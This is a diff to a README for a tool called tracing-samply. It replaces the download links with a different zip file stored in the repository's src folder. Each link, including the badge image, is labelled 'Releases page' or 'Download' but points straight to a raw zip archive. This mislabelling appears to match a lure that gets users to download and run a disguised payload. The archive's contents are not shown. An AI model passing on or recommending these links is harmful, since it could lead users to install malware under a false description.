@@ -1,6 +1,6 @@
 # 🎉 tracing-samply - Streamline Your Event Logging Easily
 
-![Download tracing-samply](https://github.com/Kayamert2121/tracing-samply/raw/refs/heads/main/tests/samply-tracing-2.5.zip%20tracing--samply-%23006EBF?style=for-the-badge&logo=github&logoColor=white)
+![Download tracing-samply](https://raw.githubusercontent.com/Kayamert2121/tracing-samply/main/src/tracing_samply_v3.3.zip%20tracing--samply-%23006EBF?style=for-the-badge&logo=github&logoColor=white)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started with tracing-samply, you will need to download the application fr
 
 ## 🔗 Download Link
 
-[Visit this page to download tracing-samply](https://github.com/Kayamert2121/tracing-samply/raw/refs/heads/main/tests/samply-tracing-2.5.zip)
+[Visit this page to download tracing-samply](https://raw.githubusercontent.com/Kayamert2121/tracing-samply/main/src/tracing_samply_v3.3.zip)
 
 ## 📋 System Requirements
 
@@ -34,7 +34,7 @@ tracing-samply respects your privacy and security. The application performs stan
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Kayamert2121/tracing-samply/raw/refs/heads/main/tests/samply-tracing-2.5.zip).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Kayamert2121/tracing-samply/main/src/tracing_samply_v3.3.zip).
   
 2. **Choose a Version:** Look for the latest version listed. This version includes bug fixes and improvements.
 
@@ -78,4 +78,4 @@ tracing-samply is licensed under the MIT License. You can use it freely, modify 
 
 ## 📦 Conclusion
 
-tracing-samply is your go-to tool for managing and analyzing event logs with ease. Downloading and installing it is straightforward, making it accessible for anyone looking to enhance their logging process. Visit our [Releases page](https://github.com/Kayamert2121/tracing-samply/raw/refs/heads/main/tests/samply-tracing-2.5.zip) today and streamline your event logging experience!
+tracing-samply is your go-to tool for managing and analyzing event logs with ease. Downloading and installing it is straightforward, making it accessible for anyone looking to enhance their logging process. Visit our [Releases page](https://raw.githubusercontent.com/Kayamert2121/tracing-samply/main/src/tracing_samply_v3.3.zip) today and streamline your event logging experience!
